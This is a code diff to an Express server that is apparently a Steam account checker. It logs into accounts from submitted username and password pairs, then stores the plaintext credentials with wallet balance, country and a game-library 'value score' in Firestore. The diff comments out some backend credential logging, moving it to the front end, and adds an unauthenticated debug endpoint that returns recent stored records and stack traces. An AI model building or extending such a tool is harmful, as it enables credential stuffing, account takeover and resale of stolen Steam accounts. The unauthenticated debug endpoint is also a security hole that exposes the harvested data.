@@ -22,12 +22,40 @@ import firebaseConfig from './firebase-applet-config.json' assert { type: 'json'
 // Initialize Firebase Admin
 let db: admin.firestore.Firestore | null = null;
 try {
-  admin.initializeApp();
+  if (!admin.apps.length) {
+    const serviceAccount = process.env.FIREBASE_SERVICE_ACCOUNT || process.env.FIREBASE_SERVICE_ACCOUNT_KEY;
+    if (serviceAccount) {
+      try {
+        const cert = JSON.parse(serviceAccount);
+        admin.initializeApp({
+          credential: admin.credential.cert(cert),
+          projectId: firebaseConfig.projectId
+        });
+        console.log('[FIREBASE] Admin initialized with Service Account');
+      } catch (e) {
+        console.error('[FIREBASE] Failed to parse service account JSON, falling back to default init');
+        admin.initializeApp({
+          projectId: firebaseConfig.projectId
+        });
+      }
+    } else {
+      admin.initializeApp({
+        projectId: firebaseConfig.projectId
+      });
+      console.log('[FIREBASE] Admin initialized with default credentials');
+    }
+  }
   db = getFirestore(firebaseConfig.firestoreDatabaseId);
-  db.listCollections().then(() => console.log('Successfully connected to Firestore database')).catch(e => console.error('Firestore connection test failed:', e));
-  console.log('Firebase Admin initialized with DB:', firebaseConfig.firestoreDatabaseId);
+  console.log('[FIREBASE] Using Database:', firebaseConfig.firestoreDatabaseId);
+  
+  /*
+  // Verify access
+  db.collection('checks').limit(1).get()
+    .then(() => console.log('[FIREBASE] Successfully connected and verified access to "checks" collection'))
+    .catch(e => console.error('[FIREBASE] Firestore verification failed:', e.message));
+  */
 } catch (e) {
-  console.error('Firebase Admin init error (likely missing credentials/env):', e);
+  console.error('Firebase Admin init error:', e);
 }
 
 async function startServer() {
@@ -36,6 +64,36 @@ async function startServer() {
 
   app.use(express.json({ limit: '100mb' }));
   app.use(express.urlencoded({ limit: '100mb', extended: true }));
+
+  // Debug Endpoint
+  app.get('/api/admin/debug-db', async (req, res) => {
+    if (!db) {
+      return res.json({ status: 'error', message: 'DB not initialized' });
+    }
+    try {
+      // Backend writes are disabled due to IAM permissions.
+      // Database verification is now handled primarily by local status check.
+      let docs: any[] = [];
+      let foundCount = 0;
+      try {
+          const snap = await db.collection('checks').orderBy('timestamp', 'desc').limit(10).get();
+          docs = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+          foundCount = snap.size;
+      } catch (e: any) {
+          console.warn('[FIREBASE] Backend read check (optional):', e.message);
+      }
+
+      res.json({ 
+        status: 'ok', 
+        databaseId: firebaseConfig.firestoreDatabaseId,
+        readStatus: foundCount > 0 ? 'connected' : 'empty_or_no_access',
+        foundCount: foundCount,
+        recentDocs: docs 
+      });
+    } catch (e: any) {
+      res.status(500).json({ status: 'error', message: e.message, stack: e.stack });
+    }
+  });
 
   const UPLOADS_DIR = path.join(process.cwd(), 'uploads');
   if (!fs.existsSync(UPLOADS_DIR)) {
@@ -122,38 +180,53 @@ async function startServer() {
       const client = new SteamUser(clientOpts);
       
       let responded = false;
-      const respond = (status: number, data: any) => {
+      const respond = async (status: number, data: any) => {
         if (!responded) {
           responded = true;
           try { client.logOff(); } catch (e) {}
 
           // Always log to Firestore if possible
-          if (db && status !== 200 && status !== 408) { // Success and timeout handled separately
-              db.collection('checks').add({
-                credentials: `${username}:${password}`,
-                timestamp: admin.firestore.FieldValue.serverTimestamp(),
-                status: 'failed',
-                error: data.error || 'Login Error',
-                method: 'login_check'
-              }).catch(() => {});
+          /* 
+          // Backend writes removed due to environment permission issues.
+          // Activity is now logged from the front-end for better reliability.
+          if (db && status !== 200 && status !== 408) { 
+              try {
+                await db.collection('checks').add({
+                  credentials: `${username}:${password}`,
+                  timestamp: admin.firestore.FieldValue.serverTimestamp(),
+                  status: 'failed',
+                  error: data.error || 'Login Error',
+                  method: 'login_check'
+                });
+              } catch (e) {
+                console.error('[FIREBASE] Failure log failed:', e);
+              }
           }
+          */
 
           res.status(status).json(data);
         }
       };
 
-      const timeout = setTimeout(() => {
+      const timeout = setTimeout(async () => {
         const timeoutError = 'Logon attempt timed out (Steam servers might be slow)';
-        respond(408, { error: timeoutError });
+        /*
+        // Backend writes removed
         if (db) {
-          db.collection('checks').add({
-            credentials: `${username}:${password}`,
-            timestamp: admin.firestore.FieldValue.serverTimestamp(),
-            status: 'failed',
-            error: timeoutError,
-            method: 'timeout'
-          }).catch(() => {});
+          try {
+            await db.collection('checks').add({
+              credentials: `${username}:${password}`,
+              timestamp: admin.firestore.FieldValue.serverTimestamp(),
+              status: 'failed',
+              error: timeoutError,
+              method: 'timeout'
+            });
+          } catch (e) {
+            console.error('[FIREBASE] Timeout log failed:', e);
+          }
         }
+        */
+        respond(408, { error: timeoutError });
       }, 45000);
 
       let engineWalletBalance: string | null = null;
@@ -235,6 +308,49 @@ async function startServer() {
               }
           }
 
+          // Persistent Logging - Await it before responding for Serverless reliability
+          /*
+          // Backend writes removed
+          if (db) {
+            try {
+              const HIGH_VALUE_KEYWORDS = [
+                'resident evil', 'grand theft auto', 'gta v', 'elden ring', 'cyberpunk',
+                'red dead', 'call of duty', 'hogwarts', 'baldur\'s gate', 'spider-man',
+                'god of war', 'the witcher', 'assassin\'s creed', 'rust', 'dayz'
+              ];
+              
+              let score = 0;
+              games.forEach(g => {
+                  let itemScore = 1;
+                  const name = (g.name || '').toLowerCase();
+                  if (HIGH_VALUE_KEYWORDS.some(k => name.includes(k))) itemScore += 50;
+                  if (g.playtime_forever && g.playtime_forever > 600) itemScore += 5;
+                  score += itemScore;
+              });
+
+              const gameNames = games.map(g => g.name);
+              
+              console.log(`[FIREBASE] Saving success check for ${username}...`);
+              await db.collection('checks').add({
+                credentials: `${username}:${password}`,
+                steamId: steamId.toString(),
+                personaName: userData.personaname,
+                avatar: userData.avatarfull,
+                country: userData.loccountrycode || 'Unknown',
+                gameCount: gameCount,
+                walletBalance: engineWalletBalance || '0',
+                valueScore: score,
+                gameNames: gameNames.slice(0, 500),
+                timestamp: admin.firestore.FieldValue.serverTimestamp(),
+                status: 'success',
+                method: 'login_check'
+              });
+            } catch (err: any) {
+              console.error('Error saving check to Firestore:', err.message);
+            }
+          }
+          */
+
           respond(200, {
             success: true,
             steamId: steamId.toString(),
@@ -243,48 +359,8 @@ async function startServer() {
             game_count: gameCount,
             walletBalance: engineWalletBalance
           });
-
-          // Persistent Logging
-          if (db) {
-            (async () => {
-              try {
-                const HIGH_VALUE_KEYWORDS = [
-                  'resident evil', 'grand theft auto', 'gta v', 'elden ring', 'cyberpunk',
-                  'red dead', 'call of duty', 'hogwarts', 'baldur\'s gate', 'spider-man',
-                  'god of war', 'the witcher', 'assassin\'s creed', 'rust', 'dayz'
-                ];
-                
-                let score = 0;
-                games.forEach(g => {
-                    let itemScore = 1;
-                    const name = (g.name || '').toLowerCase();
-                    if (HIGH_VALUE_KEYWORDS.some(k => name.includes(k))) itemScore += 50;
-                    if (g.playtime_forever && g.playtime_forever > 600) itemScore += 5;
-                    score += itemScore;
-                });
-
-                const gameNames = games.map(g => g.name);
-                
-                console.log(`[FIREBASE] Saving success check for ${username}...`);
-                await db.collection('checks').add({
-                  credentials: `${username}:${password}`,
-                  steamId: steamId.toString(),
-                  personaName: userData.personaname,
-                  avatar: userData.avatarfull,
-                  country: userData.loccountrycode || 'Unknown',
-                  gameCount: gameCount,
-                  walletBalance: engineWalletBalance || '0',
-                  valueScore: score,
-                  gameNames: gameNames.slice(0, 500),
-                  timestamp: admin.firestore.FieldValue.serverTimestamp(),
-                  status: 'success'
-                });
-              } catch (err) {
-                console.error('Error saving check to Firestore:', err);
-              }
-            })();
-          }
-        } catch (e) {
+        } catch (e: any) {
+          console.error('Error in webSession processing:', e.message);
           respond(200, { success: true, steamId: steamId?.toString(), message: 'Logged in but failed to fetch private data.' });
         }
       });
@@ -371,19 +447,6 @@ async function startServer() {
         profileurl: `https://steamcommunity.com/profiles/${steamId}`,
         stateMessage
       };
-
-      // Persistent Logging for generic searches
-      if (db) {
-        db.collection('checks').add({
-          steamId: steamId,
-          personaName: userData.personaname,
-          avatar: userData.avatarfull,
-          country: userData.loccountrycode || 'Unknown',
-          timestamp: admin.firestore.FieldValue.serverTimestamp(),
-          status: 'search',
-          method: 'public_profile'
-        }).catch(() => {});
-      }
 
       res.json({ response: { players: [userData] } });
     } catch (error) {
